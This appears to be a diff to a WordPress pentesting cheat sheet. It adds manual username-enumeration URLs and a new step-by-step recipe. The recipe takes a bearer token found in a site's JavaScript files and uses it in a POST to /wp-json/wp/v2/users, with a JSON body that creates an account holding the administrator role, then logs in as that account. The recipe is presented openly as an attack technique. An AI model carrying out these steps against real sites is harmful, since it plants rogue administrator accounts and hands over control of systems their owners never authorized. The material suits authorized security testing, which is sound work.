@@ -71,11 +71,34 @@ wpscan --url https://target.com -e vt
 ---
 
 #### Users Enumeration
+**Automatically:**
 ```bash
 wpscan --url https://target.com -e u
 ```
-- WordPress adds `author=ID` mapping to usernames:
-  - Try `https://target.com/?author=1` ➝ redirect to `/author/username/`
+
+**Manually**
+  - WordPress adds `author=ID` mapping to usernames, check these URL:
+    - `https://target.com/?author=1` ➝ redirect to `/author/username/`
+    - `https://target.com/wp-json/wp/v2/users`
+    - `https://target.com/?rest_route=/wp/v2/users`
+### Add user to the server
+- Search for `Authorization` in javascript files and request to `POST /wp-json/wp/v2/users` to add user.
+  ```bash
+  POST /wp-json/wp/v2/users
+  Authorization: Bearer <authorization_token_you_found_in_js_files>`
+  ```
+-	body of the request:
+  ```bash
+  	{
+	“username”:"yourUsername",
+	“email”:"yourEmail",
+   “password”:"yourPassword",
+	“roles”:["administrator"]
+	}
+  ```
+-	Navigate to /wp-login.php/ and login.
+
+---
 
 #### Vulnerability Scan
 ```bash
